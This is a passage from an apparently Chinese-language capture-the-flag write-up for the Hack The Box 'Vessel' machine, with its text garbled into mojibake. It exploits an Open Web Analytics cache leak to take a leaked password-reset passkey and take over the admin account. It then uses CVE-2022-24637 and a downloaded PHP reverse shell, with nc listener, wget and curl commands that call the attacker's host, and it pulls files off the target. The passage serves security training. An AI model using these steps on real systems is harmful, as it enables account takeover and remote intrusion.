<li><p>å®šä¹‰PHPç¼“å­˜æ–‡ä»¶å¤´çš„åœ°æ–¹ï¼Œå¦‚æœç”¨<code>'&lt;?php\n...'</code>ï¼Œè€Œä¸æ˜¯<code>"&lt;?php\n..."</code>ï¼Œä¼šå¯¼è‡´<code>\n</code>ä¸ä¼šè¢«è§£ææˆæ¢è¡Œç¬¦ï¼Œé‚£ä¹ˆ<code>&lt;?php\n</code>å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„PHPæ–‡ä»¶å¤´ï¼Œæ‰€åœ¨çš„ç¼“å­˜æ–‡ä»¶å°±ä¸ä¼šè¢«è§£ææˆPHPä»£ç ï¼Œåªä¼šè¢«è§£ææˆæ™®é€šæ–‡æœ¬ï¼Œä»è€Œå¯¼è‡´ç¼“å­˜ä¿¡æ¯æ³„éœ²ã€‚æ³„éœ²çš„ä¿¡æ¯è¿˜å¯è¢«ç”¨äºé‡ç½®ç®¡ç†å‘˜å¯†ç ã€‚</p>
</li>
<li><p>PHPæ–‡ä»¶å†™å…¥ï¼Œä½†éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚é€šè¿‡æ„é€ POSTè¯·æ±‚æ›´æ”¹æ—¥å¿—è·¯å¾„å’Œæ—¥å¿—ç­‰çº§ï¼Œå°†æ—¥å¿—æ–‡ä»¶è®¾ç½®ä¸ºPHPæ–‡ä»¶ã€‚é€šè¿‡åŒæ—¶æé«˜æ—¥å¿—çº§åˆ«å¹¶ä½¿ç”¨æ”»å‡»è€…æ§åˆ¶çš„æ•°æ®ç”Ÿæˆäº‹ä»¶ï¼Œå¯ä»¥å°† PHP ä»£ç æ³¨å…¥åˆ°è¯¥æ—¥å¿—æ–‡ä»¶ä¸­ã€‚è¿™å¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„PHPä»£ç ã€‚</p>
</li>
</ol>
<p>è‡ªå·±æœ¬åœ°ç”¨<code>php -a</code>æµ‹è¯•ä¸€ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php &gt; echo '&lt;?php\n/*wa0er*/\n?&gt;';
&lt;?php\n/*wa0er*/\n?&gt;

php &gt; echo "&lt;?php\n/*wa0er*/\n?&gt;";
&lt;?php
/*wa0er*/
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚ä¸Šç»“æœå¯ä»¥çœ‹å‡ºå•åŒå¼•å·è§£æçš„å·®å¼‚</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cat test1.php
&lt;?php\necho 9898;\n?&gt;

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# php -f test1.php
&lt;?php\necho 9898;\n?&gt;

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cat test2.php
&lt;?php
echo 9898;
?&gt;

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# php -f test2.php
9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚ä¸Šç»“æœå¯ä»¥çœ‹å‡ºä¸¤ç§æ ¼å¼åœ¨æ–‡ä»¶ä¸­è§£ææ•ˆæœ</p>
<p>æ¼æ´æ‰€åœ¨æºç ï¼š</p>
<p><a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php">https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php</a></p>
<p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">...
class owa_fileCache extends owa_cache {
    ...
    var $cache_file_header = '<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*';
    var $cache_file_footer = '*/</span>\n<span class="token delimiter important">?&gt;</span></span>';
    ...
    function putItemToCacheStore($collection, $id) {
            ...   
            $data = $this-&gt;cache_file_header.base64_encode(serialize($this-&gt;cache[$collection][$id])).$this-&gt;cache_file_footer;
            ...     
            $tcf_handle = @fopen($temp_cache_file, 'w');
            ...   
                fputs($tcf_handle, $data); 
                ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„ç”¨çš„å°±æ˜¯å•å¼•å·ï¼Œå¾—åˆ°çš„ç¼“å­˜æ–‡ä»¶ä¸­çš„ç¼“å­˜æ•°æ®æ ¼å¼å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*å…ˆåºåˆ—åŒ–ç„¶åbase64ç¼–ç çš„æ•°æ®*/</span>\n<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç¼“å­˜æ–‡ä»¶åå‘½åå¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$cache_file</span> <span class="token operator">=</span> <span class="token variable">$collection_dir</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@ <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$temp_cache_file</span><span class="token punctuation">,</span> <span class="token variable">$cache_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å®¡è®¡å‘ç°ï¼Œé»˜è®¤idå€¼ä¸º1ï¼Œç¼“å­˜æ–‡ä»¶æ‹¼æ¥åçš„è®¿é—®è·¯å¾„ä¸ºï¼ˆå®¡è®¡ç€é‡å…³æ³¨<code>fileCache.php</code>ã€<code>cache.php</code>ã€<code>owa_coreAPI.php</code>ã€<code>owa_entity.php</code>ã€<code>user.php</code>ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">http://localhost/owa_web/owa-data/caches/1/owa_user/xxx.php
â€œhttp://localhost/owa_web/â€è¡¨ç¤ºowaä¸»é¡µé¢æ‰€åœ¨è·¯å¾„ï¼Œæ­¤å¤„ä¸ºhttp://openwebanalytics.vessel.htb/
phpæ–‡ä»¶åâ€œxxxâ€è¡¨ç¤ºâ€œid+idå€¼â€çš„32ä½md5å€¼ï¼Œæ¯”å¦‚id=1ï¼Œé‚£ä¹ˆxxxä¸ºâ€œid1â€çš„md5å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325180016845.png" alt="image-20230325180016845"></p>
<p>åœ¨<code>openwebanalytics.vessel.htb</code>ç‚¹å‡»å¿˜è®°å¯†ç ï¼Œè¿›å…¥é‡ç½®å¯†ç é¡µé¢ï¼Œåˆšæ‰åœ¨gitæ—¥å¿—çœ‹åˆ°é‚®ç®±æ ¼å¼ï¼Œå°è¯•<code>ethan@vessel.htb</code>ä¸å­˜åœ¨ï¼Œå°è¯•<code>admin@vessel.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325192604236.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325210842981.png"></p>
<p>æç¤ºå‘é€é‚®ä»¶åˆ°<code>admin@vessel.htb</code></p>
<p>ç„¶åæ ¹æ®åˆšæ‰çš„åˆ†æï¼Œid1çš„md5å€¼å¦‚å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325203950107.png"></p>
<p>ç¼“å­˜æ–‡ä»¶çš„è®¿é—®è·¯å¾„å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®ç¼“å­˜æ–‡ä»¶ï¼Œé¡µé¢ç©ºç™½ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œè·å–åˆ°æ³„éœ²çš„base64æ•°æ®</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325211124496.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDk1MUhISkY0b0RqWmR6MGJTSWcxYnV1R2ZEYUwxVHpvcGt6d2U2SmRBZnZjU0hoLzd3WHNTIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjNjNmZWQzOGU1OWIyNmU2OGY1YjJjZDc4ZWJkNmJlNSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/</span>\n<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Base64è§£ç å¾—åºåˆ—åŒ–æ•°æ®</p>
<pre class="line-numbers language-none"><code class="language-none">O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$951HHJF4oDjZdz0bSIg1buuGfDaL1Tzopkzwe6JdAfvcSHh/7wXsS";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"c63fed38e59b26e68f5b2cd78ebd6be5";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…³é”®ç‚¹åœ¨äº<code>temp_passkey</code>çš„å€¼<code>c63fed38e59b26e68f5b2cd78ebd6be5</code>å¯ç”¨æ¥é‡ç½®adminçš„å¯†ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326114429284.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬æŠŠURLæœ«å°¾<code>owa_do</code>çš„å€¼æ”¹ä¸º<code>base.usersChangePassword</code>ï¼Œè®¿é—®</p>
<pre class="line-numbers language-none"><code class="language-none">http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326115057391.png"></p>
<p>ç›´æ¥ä¿®æ”¹å¯†ç ï¼Œç„¶åç‚¹å‡»<code>Save Your New Password</code>ï¼Œä¼šæç¤º<code>Error! Can't find your temporary passkey in the db.</code></p>
<p>ä¸€èˆ¬æ€è·¯åº”è¯¥æ˜¯æœ‰ä¸ªåå­—ç±»ä¼¼<code>temp_passkey</code>çš„å‚æ•°ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæˆ‘ä»¬åˆšæ‰è·å¾—çš„<code>temp_passkey</code>å€¼ï¼Œä»¥æ­¤æ¥ç»•è¿‡ä¿®æ”¹å¯†ç æ—¶æ‰€éœ€çš„è®¤è¯æ­¥éª¤ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å°±åœ¨<code>F12</code>é¡µé¢æºç çœ‹åˆ°äº†å¦‚ä¸‹å›¾å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326115912970.png"></p>
<p>æˆ‘ä»¬æŠŠhiddenåˆ é™¤ï¼Œå¯çœ‹åˆ°æ˜¾ç¤ºé™¤äº†å¦‚ä¸‹æ–‡æœ¬æ¡†</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326120031489.png"></p>
<p>è¾“å…¥æ–°å¯†ç ï¼Œç„¶åè¾“å…¥åˆšæ‰<code>temp_passkey</code>çš„å€¼ï¼Œç‚¹å‡»<code>Save Your New Password</code>ï¼ŒæˆåŠŸä¿®æ”¹ï¼ˆè¿™é‡Œè¯•äº†å¥½å‡ æ¬¡ï¼Œå¯èƒ½<code>temp_passkey</code>åˆ·æ–°æ¯”è¾ƒå¿«ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326121532735.png"></p>
<p>ç”¨adminç”¨æˆ·å’Œåˆšä¿®æ”¹çš„å¯†ç ç™»å½•ï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326121903697.png"></p>
<p>å·²æ˜¯adminç”¨æˆ·ï¼Œé‚£å°±å°è¯•ç”¨ä¸Šé¢æ–‡ç« æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå‘½ä»¤åå¼¹shellï¼Œä¸‹è½½ä¸‹é¢çš„exploitè„šæœ¬åˆ°æœ¬åœ°</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hupe1980/CVE-2022-24637<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…ˆå¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”¨å¦‚ä¸‹å‘½ä»¤æ‰§è¡Œè„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py -u admin -p wa0er http://openwebanalytics.vessel.htb/ 10.10.16.7 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326145523979.png"></p>
<p>å¦‚å›¾æˆåŠŸè·å–www-dataç”¨æˆ·shellï¼Œä½†è¿™ä¸ªshellç¯å¢ƒä¸ç¨³å®šï¼Œæ¢ä¸€ä¸ªäº¤äº’shell</p>
<p>ä¸‹è½½å¦‚ä¸‹è„šæœ¬åˆ°æœ¬åœ°</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¿®æ”¹ipå’Œportä¸ºæœ¬åœ°ipå’Œç«¯å£</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326151308134.png"></p>
<p>æœ¬åœ°å¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨é¶æœºwww-dataç”¨æˆ·çš„shellç¯å¢ƒï¼Œä»æœ¬åœ°ä¸‹è½½php-reverse-shell.phpåˆ°<code>/var/www/html/owa/owa-data/logs</code>ç›®å½•ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.16.7/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326160742241.png"></p>
<p>å†æ¬¡æœ¬åœ°å¼€å¯ncç›‘å¬9898ç«¯å£ï¼Œç„¶åæœ¬åœ°è¿è¡Œå¦‚ä¸‹å‘½ä»¤è§¦å‘åå¼¹shellæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">curl http://openwebanalytics.vessel.htb/owa-data/logs/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326160525009.png"></p>
<p>homeç›®å½•ä¸‹æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œethanå’Œstevenï¼Œè¿›å…¥<code>/home/ethan</code>ç›®å½•æ²¡æƒé™ï¼Œäºæ˜¯è¿›<code>/home/steven</code>ç›®å½•</p>
<p>åœ¨<code>/home/steven</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>passwordGenerator</code>æ–‡ä»¶ï¼Œåœ¨<code>/home/steven/.notes</code>æœ‰ä¸¤ä¸ªå¯ç–‘æ–‡ä»¶ï¼š<code>notes.pdf</code>å’Œ<code>screenshot.png</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327082447889.png"></p>
<p>æŠŠæ–‡ä»¶éƒ½å¤åˆ¶åˆ°<code>/var/www/html/owa/owa-data/logs/</code>ç›®å½•ä¸‹ï¼Œä¾¿äºè®¿é—®ä¸‹è½½</p>
<pre class="line-numbers language-none"><code class="language-none">cp notes.pdf /var/www/html/owa/owa-data/logs/
cp screenshot.png /var/www/html/owa/owa-data/logs/
cp passwordGenerator /var/www/html/owa/owa-data/logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å›åˆ°æœ¬åœ°ï¼Œå°†ä¸‰ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://openwebanalytics.vessel.htb/owa-data/logs/notes.pdf
wget http://openwebanalytics.vessel.htb/owa-data/logs/screenshot.png
wget http://openwebanalytics.vessel.htb/owa-data/logs/passwordGenerator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>notes.pdf</code>æ‰“å¼€éœ€è¦å¯†ç ï¼Œ<code>screenshot.png</code>å¦‚ä¸‹ï¼Œå¯†ç é•¿åº¦32ä½ï¼Œè¿™åº”è¯¥æ˜¯<code>passwordGenerator</code>çš„è¿è¡Œç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327083202789.png" style="zoom: 80%;">

<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œçœ‹åˆ°<code>passwordGenerator</code>æ˜¯Windowsä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒPE32è¡¨ç¤ºPortable Executable 32-bit</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# file passwordGenerator
